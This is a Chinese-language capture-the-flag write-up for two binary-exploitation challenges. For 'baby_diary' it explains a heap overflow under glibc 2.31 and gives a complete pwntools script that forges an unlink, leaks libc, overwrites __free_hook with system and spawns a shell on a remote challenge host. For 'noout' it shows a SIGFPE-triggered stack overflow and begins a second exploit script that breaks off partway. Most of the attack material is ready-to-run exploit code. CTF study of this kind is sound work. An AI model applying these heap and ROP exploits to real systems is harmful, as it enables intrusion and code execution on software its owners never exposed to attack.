      if ( idx  0x18 || !bufs[a1] )
        return 0xFFFFFFFFLL;
      v3 = 0;
      for ( i = 0; i  0xF )
        v3 = (v3 >> 4) + (v3 & 0xF);
      return v3;
    }
漏洞综述，程序有点恶心，最后字节用’\x00’截断，4bit位溢出。
glibc
2.31下绕过unlink，稍微有点难构造，加上本身程序逻辑，更难构造了，各种层层构造关联太强了，但最后还是找的了某些地址，成功构造利用链子，这需要控制很好的地址的值，比如实现unlink时，prev_size
要满足 0x100的倍数，不然不好设置我们unlink chunk size低3位为 0，还有构造unlink的fd->bk
指向自己本身，bk->fd指向自己本身，然而程序有点烦人的是最后一字节为’\x00’截断的，后面有4bit位溢出，这使得我们伪造chunk的fd必需要为0x100的整数倍才行。实现unlink之后就实现了堆重叠，泄漏Libc然后再修改`__free_hook`为system函数，至于glibc
2.31下如何绕过unlink，它与2.29一样的，多了个 prev_size == chunk_size的检查，这就比较麻烦，
可以参考这篇博客: 。
下面是我重重构造，实现unlink的信息
     0x5555dc297300 —▸ 0x5555dc297dd0 —▸ 0x7f8e6ac39ca0 (main_arena+96) ◂— 0x5555dc29730
####  exp
    #!/usr/bin/env python3
    #-*- coding:utf-8 -*-    # Author: i0gan
    # ref: https://bbs.pediy.com/thread-257901-1.htm
    from pwn import *
    import os
    r   =  lambda x : io.recv(x)
    ra  =  lambda   : io.recvall()
    rl  =  lambda   : io.recvline(keepends = True)
    ru  =  lambda x : io.recvuntil(x, drop = True)
    s   =  lambda x : io.send(x)
    sl  =  lambda x : io.sendline(x)
    sa  =  lambda x, y : io.sendafter(x, y)
    sla =  lambda x, y : io.sendlineafter(x, y)
    ia  =  lambda : io.interactive()
    c   =  lambda : io.close()
    li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
    context.log_level='debug'
    context.terminal = ['tmux', 'splitw', '-h']
    #context.arch = 'amd64'
    elf_path  = './baby_diary'
    libc_path = '/glibc/2.23/64/lib/libc.so.6'
    #libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
    libc_path = './libc.so.6'
    # remote server ip and port
    host = "8.140.114.72:1399"
    # if local debug
    LOCAL = 0
    LIBC  = 1
    #--------------------------func-----------------------------    def db():
        if(LOCAL):
            gdb.attach(io)
    def ad(sz, d):
        sla('>>', '1')
        sla(':', str(sz))
        if(sz > 0):
            sa(':', d)
    def dp(idx):
        sla('>>', '2')
        sla(':', str(idx))
    def rm(idx):
        sla('>>', '3')
        sla(':', str(idx))
    #--------------------------exploit--------------------------    def exploit():
        li('exploit...')
        for i in range(7): # 0-6
            ad(0x1000, "padding\n")
        #ad(0x1000-0x210 + 0x70 , "padding\n") # 7 glibc 2.29
        ad(0x1000-0x210 + 0x70 -0x40, "padding\n") # 7 glibc 2.31
        for i in range(7): # 8-14
            ad(0x28, 't\n')
        ad(0x1b20, "largebin\n") # 15
        ad(0x20, "padding\n") # 16
        rm(15)
        ad(0x2000, '\n') # 15
        ad(0x28, p64(0) + p64(0x601) + b'\n') # idx:17 get a chunk from largebin
        ad(0x28, 'a\n') # 18
        ad(0x28, 'b\n') # 19
        ad(0x38 + 0x300, 'c\n') # 20
        ad(0x28, 'd\n') # 21
        ad(0x28, 'e\n') # 22 for not merge
        # fill in tcache_entry[1](size: 0x30)
        t = 9
        for i in range(7): # 8-14
            rm(8 + i)
        rm(18) # t
        rm(20)
        rm(21)
        # clear tcache_entry[1](size: 0x30)
        for i in range(7): # 8-14
            ad(0x28, '\n')
        # fastbin to smallbin
        ad(0x450, '\n') #18
        # get a chunk from smallbin , another smallbin chunk to tcache
        # 20, change fake chunk's fd->bk to point to fake chunk
        ad(0x28,  b'\x03' + b'\x00' * 7 + b'\n')
        # clear chunk from tcache
        ad(0x28, 'clear\n') # 21
        for i in range(7): # 8-14
            rm(8 + i)
        # free to fastbin
        rm(19)
        rm(17)
        for i in range(7): # 8-14
            ad(0x28, '\n')
        # change fake chunk's bk->fd
        ad(0x28, b'\n') # 17
        # Make house of einherjar
        rm(18)
        for i in range(6): # 8-14
            rm(8 + i)
        ad(0x170, '\n') # 8
        ad(0x450, '\n') # 9
        ad(0x60, '\n')  # 10
        rm(8)
        ad(0x177, b'\x00' * 0x177) # 8
        rm(8)
        ad(0x177, (b'\x00' * 0x16f) + b'\x06' + b'\n') # 8
        # unlink
        rm(9)
        # leak libc 
        ad(0x430, '\n') # 9
        dp(22) 
        leak = u64(ru('\x7f')[-5:] + b'\x7f\x00\x00')
        libc_base = leak - libc.sym['__malloc_hook'] - 0x10 - 96
        system = libc_base + libc.sym['system']
        free_hook = libc_base + libc.sym['__free_hook']
        li('libc_base: ' + hex(libc_base))
        #ad(0x17, p64(free_hook) + b'\n')
        for i in range(3):
            ad(0x28, b'\n')
        rm(20) # 
        rm(0) # for clean
        rm(1) # for clean
        ad(0x18, '/bin/sh\n')
        rm(9) #
        ad(0x430, b'A' * 0x400 + p64(free_hook) + p64(0) + b'\n') 
        ad(0x28, '\n')
        ad(0x28, p64(system) + b'\n')
        db()
        rm(0)
        # double free
        #rm(0)
        '''
        rm(9)
        ad(0x37, b'\x00' + b'\x00' * 0x30 + b'\x50' + b'\n')
        '''
    def finish():
        ia()
        c()
    #--------------------------main-----------------------------    if __name__ == '__main__':
        if LOCAL:
            elf = ELF(elf_path)
            if LIBC:
                libc = ELF(libc_path)
            io = elf.process()
        else:
            elf = ELF(elf_path)
            io = remote(host.split(':')[0], int(host.split(':')[1]))
            if LIBC:
                libc = ELF(libc_path)
        exploit()
        finish()
###  noout
没有打印函数，通过’\x00’字节绕过字符串比较
    __sighandler_t sub_8049424()
    {
      __sighandler_t result; // eax
      char src[32]; // [esp+Ch] [ebp-5Ch] BYREF
      char buf[48]; // [esp+2Ch] [ebp-3Ch] BYREF
      const char *v3; // [esp+5Ch] [ebp-Ch]
      init_();
      v3 = "tell me some thing";
      read(0, buf, 0x30u);
      v3 = "Tell me your name:\n";
      read(0, src, 0x20u);
      sub_80493EC(src);
      strcpy(dest, src);
      v3 = "now give you the flag\n";
      read(unk_804C080, src, 0x10u);
      result = (__sighandler_t)str_cmp(src, off_804C034);// 字符串比较
      if ( !result )
        result = sub_8049269();
      return result;
    }
再利用计算错误抛出SIGFPE信号使调用漏洞函数
    __sighandler_t sub_8049269()
    {
      __sighandler_t result; // eax
      void (*v1)(int); // [esp+0h] [ebp-18h] BYREF
      int v2[2]; // [esp+4h] [ebp-14h] BYREF
      const char *v3; // [esp+Ch] [ebp-Ch]
      v3 = "give me the soul:";
      __isoc99_scanf("%d", v2);
      v3 = "give me the egg:";
      __isoc99_scanf("%d", &v1);
      result = v1;
      if ( v1 )
      {
        signal(8, (__sighandler_t)vuln);            // set handler
                                                    // SIGFPE 表示一个算数运算异常
        v2[1] = v2[0] / (int)v1;                    // 使运算异常调用漏洞函数
        result = signal(8, 0);
      }
      return result;
    }
    ssize_t vuln()
    {
      char buf[68]; // [esp+0h] [ebp-48h] BYREF
      return read(0, buf, 0x100u);                  // stack overflow
    }
漏洞函数中就是简单的堆栈溢出了，采用dl_runtime_resolve攻击。
####  exp
    #!/usr/bin/env python2
    #-*- coding:utf-8 -*-    # Author: i0gan
    from pwn import *
    from roputils import ROP
    import os
    # roputils: https://github.com/inaz2/roputils/blob/master/roputils.py
    r   =  lambda x : io.recv(x)
    ra  =  lambda   : io.recvall()
    rl  =  lambda   : io.recvline(keepends = True)
    ru  =  lambda x : io.recvuntil(x, drop = True)
    s   =  lambda x : io.send(x)
    sl  =  lambda x : io.sendline(x)
    sa  =  lambda x, y : io.sendafter(x, y)
    sla =  lambda x, y : io.sendlineafter(x, y)
    ia  =  lambda : io.interactive()
    c   =  lambda : io.close()
    li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
    context.log_level='debug'
    context.terminal = ['tmux', 'splitw', '-h']
    #context.arch = 'amd64'
    elf_path  = './test'
    libc_path = '/glibc/2.23/64/lib/libc.so.6'
    libc_path = './libc.so.6'
    # remote server ip and port
    host = "39.105.138.97:1234"
    # if local debug
    LOCAL = 0
    LIBC  = 0
    #--------------------------func-----------------------------    def db():
        if(LOCAL):
            gdb.attach(io)
    #--------------------------exploit--------------------------    def exploit():
        li('exploit...')